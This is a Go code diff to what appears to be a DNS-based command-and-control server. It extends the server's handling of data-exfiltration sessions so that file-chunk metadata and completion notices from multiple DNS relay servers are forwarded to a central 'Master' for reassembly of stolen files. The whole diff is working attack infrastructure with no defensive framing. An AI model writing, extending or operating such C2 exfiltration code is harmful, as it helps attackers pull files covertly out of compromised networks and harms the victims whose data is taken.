@@ -833,11 +833,40 @@ func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
 
 	sessionID := fmt.Sprintf("%08x", tracker.SessionID)
 
-	// Forward completion to Master - Master handles assembly
+	// Get session details for completion request
+	// Try both exfilSessions (has full metadata) and tracker (has TotalChunks from init frame)
+	c2.mutex.RLock()
+	session, exists := c2.exfilSessions[sessionID]
+	var totalChunks int
+	var fileName string
+	var fileSize int64
+	if exists {
+		totalChunks = int(session.TotalChunks)
+		fileName = session.FileName
+		fileSize = int64(session.FileSize)
+	}
+	// Fallback to tracker's TotalChunks if session doesn't have it
+	if totalChunks == 0 && tracker.TotalChunks > 0 {
+		totalChunks = int(tracker.TotalChunks)
+	}
+	c2.mutex.RUnlock()
+
+	// Forward completion to Master with full details - Master handles assembly
 	if masterClient != nil {
-		go masterClient.MarkExfilCompleteByTag(tag)
-		if c2.debug {
-			logf("[Exfil] Forwarded completion for session=%s to Master", sessionID)
+		req := ExfilCompleteRequest{
+			SessionID:   sessionID,
+			TotalChunks: totalChunks,
+			FileName:    fileName,
+			FileSize:    fileSize,
+		}
+		if err := masterClient.MarkExfilComplete(req); err != nil {
+			if c2.debug {
+				logf("[Exfil] Failed to forward completion for session=%s: %v", sessionID, err)
+			}
+			// Try by tag as fallback
+			masterClient.MarkExfilCompleteByTag(tag)
+		} else if c2.debug {
+			logf("[Exfil] Forwarded completion for session=%s (totalChunks=%d) to Master", sessionID, totalChunks)
 		}
 	}
 
@@ -1124,9 +1153,34 @@ func (c2 *C2Manager) handleExfilHeader(session *ExfilSession, meta *ExfilMetadat
 		session.Status = "receiving"
 	}
 	session.LastActivity = time.Now()
+	// Capture values for forwarding to Master
+	totalChunks := session.TotalChunks
+	fileName := session.FileName
+	fileSize := session.FileSize
+	sessionID := session.SessionID
+	jobID := session.JobID
 	c2.mutex.Unlock()
 
 	c2.persistExfilSession(session)
+
+	// SHADOW MESH: Forward header metadata to Master so it knows totalChunks
+	// This is critical because other DNS servers may receive data chunks without metadata
+	if masterClient != nil && totalChunks > 0 {
+		req := ExfilChunkRequest{
+			SessionID:   sessionID,
+			JobID:       jobID,
+			ChunkIndex:  0, // Header is chunk 0
+			TotalChunks: int(totalChunks),
+			FileName:    fileName,
+			FileSize:    int64(fileSize),
+			PayloadB64:  "", // Header has no data payload for Master
+		}
+		go func() {
+			if _, err := masterClient.SubmitExfilChunk(req); err != nil && c2.debug {
+				logf("[Exfil] Failed to forward header metadata to Master: %v", err)
+			}
+		}()
+	}
 }
 
 func (c2 *C2Manager) persistExfilSession(session *ExfilSession) {
@@ -1803,14 +1857,14 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 		c2.mutex.Unlock()
 
-		// Forward metadata to Master so it knows to expect chunks from any DNS server
+		// Forward metadata to Master so it knows to expect chunks
+		// Master will ignore this (chunk_index=0 with empty data) but it helps with logging
 		if masterClient != nil {
 			c2.mutex.RLock()
 			masterID, isMasterTask := c2.masterTaskIDs[taskID]
 			c2.mutex.RUnlock()
 
 			if isMasterTask {
-				// Send a metadata notification to Master (chunk 0 with totalChunks info)
 				go masterClient.SubmitResult(masterID, beaconID, 0, totalChunks, "")
 			}
 		}
